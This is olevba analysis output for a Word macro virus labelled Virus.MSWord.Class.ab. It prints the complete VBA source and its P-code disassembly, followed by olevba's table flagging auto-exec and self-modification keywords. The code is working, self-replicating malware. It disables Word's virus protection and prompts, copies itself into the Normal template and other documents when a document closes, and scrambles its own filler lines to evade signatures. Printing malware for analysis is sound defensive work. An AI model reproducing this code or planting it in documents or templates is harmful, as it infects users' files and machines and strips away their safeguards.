olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
AA64 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UIL = QBN + KGN
Options.SaveNormalPrompt = 0
OFG = SSM + VUE
VH70 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
PVF = LCV + OAM
Application.EnableCancelKey = 0
CCR = GBG + IGU
Options.ConfirmConversions = 0
VIG = DDO + JJP
Options.VirusProtection = 0
HNE = EMB + KTF
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
RIG = UNN + JCM
Set DV18 = ActiveDocument.VBProject.VBComponents.Item(1)
PUS = ALU + JOL
EI41 = True
LKH = IFB + FVB
End If
IIK = DKF + NLD
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
UOL = ICR + KQN
Set DV18 = NormalTemplate.VBProject.VBComponents.Item(1)
SAE = BCH + CAL
DE31 = True
OLS = BEO + JHD
End If
PUL = BQI + KKE
If DE31 <> True And EI41 <> True Then GoTo QQ26
HCM = DUC + JGT
If DE31 = True Then DV18.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AA64 - 1))
QGO = FBA + HRG
If EI41 = True Then DV18.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VH70 - 1))
FKF = HAK + ETM
With DV18.CodeModule
QUH = LBN + JVC
For x = 2 To (DV18.CodeModule.CountOfLines - 1) Step 2
UNH = DKE + VCA
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
HMU = LIS + SOP
Next x
VHK = JPD + JLR
End With
LJL = FNK + OTI
QQ26:
GGD = LEM + HTK
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.ab
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10831 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	Ld GGR 
' 	Ld AQR 
' 	Add 
' 	St PLM 
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld SRI 
' 	Ld VTB 
' 	Add 
' 	St PAJ 
' Line #4:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St AA64 
' Line #5:
' 	Ld QBN 
' 	Ld KGN 
' 	Add 
' 	St UIL 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	Ld SSM 
' 	Ld VUE 
' 	Add 
' 	St OFG 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St VH70 
' Line #9:
' 	Ld LCV 
' 	Ld OAM 
' 	Add 
' 	St PVF 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	Ld GBG 
' 	Ld IGU 
' 	Add 
' 	St CCR 
' Line #12:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	Ld DDO 
' 	Ld JJP 
' 	Add 
' 	St VIG 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' 	Ld EMB 
' 	Ld KTF 
' 	Add 
' 	St HNE 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld UNN 
' 	Ld JCM 
' 	Add 
' 	St RIG 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set DV18 
' Line #19:
' 	Ld ALU 
' 	Ld JOL 
' 	Add 
' 	St PUS 
' Line #20:
' 	LitVarSpecial (True)
' 	St EI41 
' Line #21:
' 	Ld IFB 
' 	Ld FVB 
' 	Add 
' 	St LKH 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld DKF 
' 	Ld NLD 
' 	Add 
' 	St IIK 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #25:
' 	Ld ICR 
' 	Ld KQN 
' 	Add 
' 	St UOL 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set DV18 
' Line #27:
' 	Ld BCH 
' 	Ld CAL 
' 	Add 
' 	St SAE 
' Line #28:
' 	LitVarSpecial (True)
' 	St DE31 
' Line #29:
' 	Ld BEO 
' 	Ld JHD 
' 	Add 
' 	St OLS 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld BQI 
' 	Ld KKE 
' 	Add 
' 	St PUL 
' Line #32:
' 	Ld DE31 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld EI41 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo QQ26 
' 	EndIf 
' Line #33:
' 	Ld DUC 
' 	Ld JGT 
' 	Add 
' 	St HCM 
' Line #34:
' 	Ld DE31 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld AA64 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld DV18 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #35:
' 	Ld FBA 
' 	Ld HRG 
' 	Add 
' 	St QGO 
' Line #36:
' 	Ld EI41 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld VH70 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld DV18 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #37:
' 	Ld HAK 
' 	Ld ETM 
' 	Add 
' 	St FKF 
' Line #38:
' 	StartWithExpr 
' 	Ld DV18 
' 	MemLd CodeModule 
' 	With 
' Line #39:
' 	Ld LBN 
' 	Ld JVC 
' 	Add 
' 	St QUH 
' Line #40:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld DV18 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #41:
' 	Ld DKE 
' 	Ld VCA 
' 	Add 
' 	St UNH 
' Line #42:
' 	Ld x 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #43:
' 	Ld LIS 
' 	Ld SOP 
' 	Add 
' 	St HMU 
' Line #44:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	Ld JPD 
' 	Ld JLR 
' 	Add 
' 	St VHK 
' Line #46:
' 	EndWith 
' Line #47:
' 	Ld FNK 
' 	Ld OTI 
' 	Add 
' 	St LJL 
' Line #48:
' 	Label QQ26 
' Line #49:
' 	Ld LEM 
' 	Ld HTK 
' 	Add 
' 	St GGD 
' Line #50:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

